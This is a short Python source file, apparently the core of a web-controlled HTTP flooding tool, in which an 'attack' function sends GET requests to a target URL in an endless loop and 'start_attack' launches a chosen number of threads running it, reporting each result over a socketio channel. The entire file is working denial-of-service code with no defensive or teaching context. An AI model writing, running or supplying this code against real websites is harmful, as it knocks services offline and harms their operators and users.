
import threading
import asyncio
import httpx

def attack(url, socketio):
    async def make_request():
        async with httpx.AsyncClient() as client:
            try:
                response = await client.get(url, timeout=5)
                socketio.emit("log", f"[{response.status_code}] Request to {url}")
            except Exception as e:
                socketio.emit("log", f"[ERROR] {str(e)}")

    while True:
        try:
            asyncio.run(make_request())
        except:
            continue

def start_attack(url, num, socketio):
    for _ in range(num):
        threading.Thread(target=attack, args=(url, socketio), daemon=True).start()
